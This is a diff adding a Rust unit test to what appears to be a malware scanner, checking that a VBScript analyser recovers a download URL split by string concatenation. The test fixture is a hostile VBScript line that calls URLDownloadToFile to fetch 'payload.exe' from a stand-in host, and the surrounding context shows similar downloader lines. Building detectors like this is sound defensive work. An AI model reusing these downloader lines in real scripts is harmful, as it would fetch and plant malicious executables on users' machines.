@@ -10021,6 +10021,25 @@ URLDownloadToFile 0, u, "payload.exe", 0, 0"#;
     }
 
     #[test]
+    fn vbs_urldownloadtofile_url_extracted_from_inline_concat_argument() {
+        let mut env = Environment::new(&Config::default());
+        let vbs =
+            br#"URLDownloadToFile 0, "http://" & "vbs-urldown-concat.example/payload.exe", "payload.exe", 0, 0"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-urldown-concat.example/payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS URLDownloadToFile inline concat URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_wscript_shell_run_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Set sh = CreateObject("WScript.Shell")
